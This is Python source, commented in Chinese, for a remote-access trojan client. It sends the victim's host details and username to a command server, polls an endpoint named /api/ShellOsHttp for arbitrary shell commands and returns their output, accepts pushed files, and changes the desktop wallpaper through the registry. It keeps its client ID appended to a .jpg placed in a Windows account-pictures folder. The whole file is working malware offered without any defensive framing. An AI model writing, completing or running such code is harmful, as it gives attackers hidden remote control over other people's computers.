# -*- coding:utf-8 -*-
# cython: language_level=3
import base64
import getpass
import json
import os
import platform
import random
import shutil
import socket
import string
import threading
import time
from PIL import Image
import subprocess
import requests

# 服务器IP地址
ServerIP = "%s"
current_directory = os.getcwd()

def send_output_to_server(message):
    """将输出发送到服务器"""
    data = {
        "message": message,
        "clientID": get_cookie()
    }
    try:
        response = requests.post(f"http://{ServerIP}:5264/api/init/receive", json=data)
        response.raise_for_status()
    except Exception as e:
        pass

def generate_random_string(length):
    """生成指定长度的随机字符串"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def get_host_ip():
    """获取主机的本地IP地址"""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]

def get_cookie():
    """返回当前的Cookie值，如果不存在则生成新的值"""
    target_folder = r"C:\Users\Public\AccountPictures\S-1-5-21-638547129-307165535-183523732-1002"
    target_file_path = os.path.join(target_folder, "R-Cadimn.jpg")
    
    if os.path.exists(target_file_path):
        with open(target_file_path, 'rb') as file:
            return file.readlines()[-1].decode('utf-8', errors='ignore').strip()

def execute_command(command):
    """执行本地命令并返回输出"""
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=current_directory)
    return result.stdout.strip(), result.stderr.strip()

def command_start(command):
    """处理输入命令并根据需要发送输出到服务器"""
    global current_directory
    
    if command.startswith('cd '):
        target_dir = command[3:].strip()
        try:
            os.chdir(target_dir)
            current_directory = os.getcwd()
            output = f"已更改目录到: {current_directory}"
            send_output_to_server(output)
        except FileNotFoundError:
            error_message = f"错误: 找不到目录 '{target_dir}'"
            send_output_to_server(error_message)
        except Exception as e:
            error_message = f"错误: {str(e)}"
            send_output_to_server(error_message)
        return

    output, error_output = execute_command(command)
    if output:
        send_output_to_server(output)
    elif error_output:
        send_output_to_server(error_output)
    else:
        send_output_to_server("命令执行成功，但没有输出。")

def shell_os_http():
    """循环监听服务器命令并执行"""
    while True:
        command = requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp", data=get_cookie(), timeout=None).text
        threading.Thread(target=command_start, args=(command,)).start()

def heartbeat_http():
    """定期向服务器发送心跳信号"""
    while True:
        requests.post(f"http://{ServerIP}:5264/api/HeartbeatHttp", data=get_cookie())
        time.sleep(180)

def init_client():
    """初始化客户端所需的文件夹和文件"""
    target_folder = r"C:\Users\Public\AccountPictures\S-1-5-21-638547129-307165535-183523732-1002"
    target_file_path = os.path.join(target_folder, "R-Cadimn.jpg")
    os.makedirs(target_folder, exist_ok=True)

    initial_file_path = os.path.join(os.path.dirname(__file__), "R-Cadimn.jpg")

    # 如果目标文件不存在，则复制初始文件并生成新的Cookie
    if not os.path.exists(target_file_path):
        with open(initial_file_path, 'rb') as c:
            jpg_data = c.read()
            with open(target_file_path, 'wb') as b:
                b.write(jpg_data)
        
        cookie_admin = f"{platform.system()}_{get_host_ip()}_{generate_random_string(7)}"
        with open(target_file_path, "a", encoding="utf-8") as f:
            f.write("\n" + cookie_admin)

    return not os.path.exists(os.path.join(target_folder, "R-Cadmin.jpg"))

def init_server():
    """向服务器发送初始化请求"""
    if init_client():
        data = {
            'WhoamiName': get_cookie(),
            'sysPath': os.path.abspath(__file__),
            'systemName': platform.system(),
            'Cpu': platform.processor(),
            'Cpuarchitecture': platform.machine(),
            'IP': get_host_ip(),
            'AdminName': getpass.getuser()
        }

        try:
            headers = {'Content-Type': 'application/json; charset=utf-8'}
            requests.post(f"http://{ServerIP}:5264/api/init/cookie", data=json.dumps(data).encode('utf-8'), headers=headers)
            return True
        except Exception as e:
            send_output_to_server(f"初始化服务器时发生错误: {e}")
            return False

def heartbeat_upload_response(response_data):
    """处理服务器上传响应"""
    file_local_path = r"C:\Users\Public\AccountPictures\S-1-5-21-638547129-307165535-183523732-1002"
    file_server_path = response_data["fileServerPath"]
    file_data_base64 = response_data["fileDataBase64"]
    wallpaper_or_upload_file = response_data["WallpaperOrUploadFile"]
    
    file_data = base64.b64decode(file_data_base64)
    _, file_type_and_name = os.path.split(file_server_path)
    os.makedirs(os.path.dirname(file_local_path), exist_ok=True)
    file_main_path = os.path.join(file_local_path, file_type_and_name)

    return file_main_path, file_data, wallpaper_or_upload_file

def resize_image(input_image_path, output_image_path, new_width, new_height):
    """调整图像大小并保存"""
    with Image.open(input_image_path) as image:
        resized_image = image.resize((new_width, new_height))
        resized_image.save(output_image_path)

def heartbeat_receive_and_upload():
    """接收并上传文件到服务器"""
    while True:
        try:
            response = requests.post(f"http://{ServerIP}:5264/api/Attack/Upload", data=get_cookie(), stream=True, timeout=None)
            if response.status_code == 200:
                response_data = response.json()
                file_main_path, file_data, wallpaper_and_upload_flag = heartbeat_upload_response(response_data)
                # 完整路径,文件内容,换壁纸还是保存图片 换壁纸True
                if wallpaper_and_upload_flag:
                    with open(file_main_path, 'wb') as wallpaper:
                        wallpaper.write(file_data)
                    if platform.system().startswith("Win"):
                        resize_image(
                            file_main_path,
                            f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\WallpaperEngineOverride_randomOKDRHM{os.path.splitext(file_main_path)[-1]}",
                            1920, 1080
                        )
                        execute_command(f'reg add "hkcu\\control panel\\desktop" /v wallpaper /d "C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\WallpaperEngineOverride_randomOKDRHM{os.path.splitext(file_main_path)[-1]}" /f')
                            
                        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles"):
                            shutil.rmtree(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles")
                        for _ in range(4):
                            execute_command("RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters")
                        send_output_to_server("更换壁纸成功")
                    else:
                        send_output_to_server("仅支持Windows系统")
                else:
                    with open(file_main_path, 'wb') as file:
                        file.write(file_data)
                        send_output_to_server("上传文件成功")
            else:
                time.sleep(2)
        except requests.exceptions.RequestException as e:
            send_output_to_server(f"请求错误: {e}")
            time.sleep(5)  # 网络错误等待5秒重试

if __name__ == "__main__":
    if init_server():
        # 启动线程
        threads = [
            threading.Thread(target=shell_os_http),
            threading.Thread(target=heartbeat_http),
            threading.Thread(target=heartbeat_receive_and_upload)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()